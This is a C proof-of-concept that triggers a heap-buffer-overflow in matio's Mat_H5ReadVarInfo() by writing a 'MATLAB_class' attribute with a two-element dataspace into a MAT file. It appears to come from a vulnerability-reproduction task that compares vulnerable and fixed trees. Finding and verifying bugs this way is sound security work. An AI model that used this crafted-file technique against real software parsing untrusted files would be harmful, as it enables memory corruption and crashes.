/*
 * PoC for a heap-buffer-overflow in Mat_H5ReadVarInfo() (src/mat73.c).
 *
 * The function sizes its "MATLAB_class" read buffer for a single scalar
 * string element (calloc(class_len + 1, 1), where class_len comes from
 * H5Tget_size() on the attribute's datatype) and then calls H5Aread()
 * on the attribute directly. H5Aread() writes (dataspace element count)
 * * (memory type size) bytes into the supplied buffer, so a
 * "MATLAB_class" attribute whose dataspace is non-scalar (more than one
 * element) overflows that buffer.
 *
 * This probe:
 *   1. Creates a normal v7.3 MAT file with Mat_CreateVer() (public API).
 *   2. Re-opens the underlying HDF5 container directly (plain HDF5 calls,
 *      not matio) and adds one dataset whose "MATLAB_class" attribute is
 *      a fixed-length string type with a *non-scalar* (2-element)
 *      dataspace, instead of the scalar dataspace every legitimate
 *      MATLAB-written file uses.
 *   3. Re-opens the file with Mat_Open() and reads the variable back with
 *      Mat_VarReadNextInfo() -- both public matio entry points -- which
 *      drives the vulnerable code in Mat_H5ReadVarInfo().
 *
 * Build (once matio is configured/built with --with-hdf5):
 *   cc -fsanitize=address -I<matio>/src poc_matlab_class_nonscalar.c \
 *      -L<matio-build>/src/.libs -lmatio -lhdf5 -o poc
 *
 * Run:
 *   ./poc /tmp/poc.mat
 *
 * Expected: on the vulnerable tree, ASan reports a heap-buffer-overflow
 * WRITE inside H5Aread() (called from Mat_H5ReadVarInfo). On a tree with
 * the real upstream fix, Mat_H5ReadVarInfo rejects the file with
 * MATIO_E_FILE_FORMAT_VIOLATION and Mat_VarReadNextInfo() returns NULL;
 * no overflow occurs.
 */
#include <hdf5.h>
#include <matio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int
craft_malicious_variable(const char *path)
{
    hid_t file_id, dset_id, mspace_id, attr_type_id, aspace_id, attr_id;
    hsize_t dims[1] = {4};
    hsize_t class_dims[1] = {2}; /* non-scalar: 2 elements, not 1 */
    const char class_payload[2][16] = {"double", "double"};
    int rc = 0;

    file_id = H5Fopen(path, H5F_ACC_RDWR, H5P_DEFAULT);
    if ( file_id < 0 ) {
        fprintf(stderr, "H5Fopen failed\n");
        return -1;
    }

    mspace_id = H5Screate_simple(1, dims, NULL);
    dset_id = H5Dcreate(file_id, "poc_var", H5T_NATIVE_DOUBLE, mspace_id, H5P_DEFAULT, H5P_DEFAULT,
                        H5P_DEFAULT);
    H5Sclose(mspace_id);
    if ( dset_id < 0 ) {
        fprintf(stderr, "H5Dcreate failed\n");
        H5Fclose(file_id);
        return -1;
    }

    /* Fixed-length string type, 16 bytes/element -- ordinary and well
     * under MAX_CLASS_NAME, so the shipped tree's new size/type guards
     * do not reject it. The defect is the *dataspace*, not the type. */
    attr_type_id = H5Tcopy(H5T_C_S1);
    H5Tset_size(attr_type_id, sizeof(class_payload[0]));

    /* Legitimate MAT73 writers always use H5Screate(H5S_SCALAR) here;
     * this probe instead uses a simple 2-element dataspace. */
    aspace_id = H5Screate_simple(1, class_dims, NULL);
    attr_id =
        H5Acreate(dset_id, "MATLAB_class", attr_type_id, aspace_id, H5P_DEFAULT, H5P_DEFAULT);
    if ( attr_id < 0 || 0 > H5Awrite(attr_id, attr_type_id, class_payload) ) {
        fprintf(stderr, "writing MATLAB_class attribute failed\n");
        rc = -1;
    }

    if ( attr_id >= 0 )
        H5Aclose(attr_id);
    H5Sclose(aspace_id);
    H5Tclose(attr_type_id);
    H5Dclose(dset_id);
    H5Fclose(file_id);
    return rc;
}

int
main(int argc, char **argv)
{
    const char *path = (argc > 1) ? argv[1] : "/tmp/poc_matlab_class_nonscalar.mat";
    mat_t *mat;
    matvar_t *var;

    mat = Mat_CreateVer(path, NULL, MAT_FT_MAT73);
    if ( NULL == mat ) {
        fprintf(stderr, "Mat_CreateVer failed\n");
        return 1;
    }
    Mat_Close(mat);

    if ( 0 != craft_malicious_variable(path) ) {
        return 1;
    }

    /* Public matio read path: this is what a consumer of an untrusted
     * .mat file calls. On the vulnerable tree this aborts under ASan
     * inside Mat_H5ReadVarInfo's H5Aread() of "MATLAB_class". On the
     * golden-fixed tree it returns NULL (rejected, no variable read). */
    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( NULL == mat ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 1;
    }

    var = Mat_VarReadNextInfo(mat);
    if ( NULL == var ) {
        printf("rejected: no overflow (fixed behavior)\n");
    } else {
        printf("read variable %s without rejection\n", var->name);
        Mat_VarFree(var);
    }

    Mat_Close(mat);
    return 0;
}